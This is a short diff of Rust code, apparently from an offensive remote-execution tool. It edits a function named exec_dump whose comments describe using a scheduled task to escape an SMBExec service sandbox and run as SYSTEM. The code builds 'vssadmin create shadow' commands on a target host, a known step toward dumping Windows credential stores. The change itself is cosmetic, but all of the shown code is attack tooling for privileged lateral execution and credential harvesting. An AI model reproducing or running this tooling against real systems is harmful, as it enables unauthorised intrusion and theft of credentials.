@@ -4240,7 +4240,7 @@ async fn exec_dump(
                 // Bypass: scheduled task runs outside the SMBExec service sandbox.
                 // The task executes as SYSTEM and can create VSS shadows / write files.
                 let task_name = format!("OvtVss{:08X}", rand::random::<u32>());
-                let log_path = format!("C:\\Windows\\Temp\\{}.log", &task_name);
+                let log_path = format!("C:\\Windows\\Temp\\{}.log", task_name);
                 let task_cmd = format!(
                     "cmd.exe /c vssadmin create shadow /for=C: > {} 2>&1",
                     log_path
@@ -4426,7 +4426,7 @@ async fn exec_dump(
         }
         if !task_script.is_empty() {
             task_script.truncate(task_script.len().saturating_sub(4));
-            let log_path = format!("C:\\Windows\\Temp\\{}.log", &task_name);
+            let log_path = format!("C:\\Windows\\Temp\\{}.log", task_name);
             let task_cmd = format!("cmd.exe /c {} > {} 2>&1", task_script, log_path);
             if let Ok(out) =
                 run_scheduled_task_bypass(ctx, state, target, &task_name, &task_cmd, 20).await
